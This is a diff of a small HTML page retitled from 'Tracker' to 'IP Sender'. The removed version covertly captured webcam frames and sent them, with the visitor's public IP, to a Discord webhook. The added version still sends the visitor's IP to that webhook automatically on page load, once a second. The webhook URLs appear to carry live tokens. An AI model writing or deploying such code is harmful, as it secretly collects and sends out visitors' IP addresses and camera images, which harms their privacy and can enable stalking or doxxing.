@@ -2,102 +2,45 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
-<title>Tracker</title>
+<title>IP Sender</title>
 </head>
 <body>
 <script>
 const webhook = "https://discord.com/api/webhooks/1385579764592545852/x523eBesGbYlF1EtN7CEwy52A8EpvX9fOGl37Xx63YeS1sEHLAu7_kEif9krCA3bt_lY";
 
->
-const webhook = "https://discord.com/api/webhooks/1375557646765002942/qYhl3vAwgFaFSvn_Tnzno4Z-NlGa_HpS8omMiw53Dt1iwKdjPjkAMxYyWtNl_bo3CleU";
-
-async function fetchIPFromAPI(url, parseFn) {
+async function fetchIP() {
   try {
-    let res = await fetch(url);
+    const res = await fetch('https://api.ipify.org?format=json');
     if (!res.ok) return null;
-    let data = await res.json();
-    return parseFn(data);
+    const data = await res.json();
+    return data.ip;
   } catch {
     return null;
   }
 }
 
-async function getPublicIP() {
-  let ip = await fetchIPFromAPI('https://api.ipify.org?format=json', data => data.ip);
-  if (ip) return ip;
-
-  ip = await fetchIPFromAPI('https://ipapi.co/json/', data => data.ip);
-  if (ip) return ip;
-
-  ip = await fetchIPFromAPI('https://ipinfo.io/json', data => data.ip);
-  if (ip) return ip;
-
-  return null;
-}
-
-async function sendData(imageBlob, ip) {
-  const form = new FormData();
-  form.append('payload_json', JSON.stringify({
-    content: `IP Info: ${ip ? ip : 'Unavailable'}`
-  }));
-  if (imageBlob) {
-    form.append('file', imageBlob, 'capture.png');
-  }
-
+async function sendIP(ip) {
   try {
-    const response = await fetch(webhook, {
+    await fetch(webhook, {
       method: 'POST',
-      body: form
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ content: `IP Info: ${ip ? ip : 'Unavailable'}` })
     });
-    if (!response.ok) {
-      console.error('Failed to send webhook:', response.status, response.statusText);
-    }
   } catch (e) {
-    console.error('Error sending webhook:', e);
-  }
-}
-
-async function startIPSender(ip) {
-  // Immediately send once
-  await sendData(null, ip);
-  // Then send every 1 second without delay
-  setInterval(() => {
-    sendData(null, ip);
-  }, 1000);
-}
-
-async function captureLoop(ip) {
-  let stream;
-  try {
-    stream = await navigator.mediaDevices.getUserMedia({video:true});
-  } catch {
-    console.error('Camera access denied or unavailable');
-    return;
-  }
-
-  const video = document.createElement('video');
-  video.srcObject = stream;
-  await video.play();
-
-  const canvas = document.createElement('canvas');
-  const ctx = canvas.getContext('2d');
-
-  while (true) {
-    await new Promise(r => setTimeout(r, 500));
-    canvas.width = video.videoWidth || 640;
-    canvas.height = video.videoHeight || 480;
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-    const blob = await new Promise(res => canvas.toBlob(res, 'image/png'));
-
-    await sendData(blob, ip);
+    console.error('Failed to send IP:', e);
   }
 }
 
 (async () => {
-  const ip = await getPublicIP();
-  startIPSender(ip); // start IP sending immediately and continuously
-  captureLoop(ip);   // start sending camera images if allowed
+  const ip = await fetchIP();
+
+  // Send IP instantly once
+  sendIP(ip);
+
+  // Send IP every 1 second
+  setInterval(() => {
+    sendIP(ip);
+  }, 1000);
 })();
 </script>
 </body>
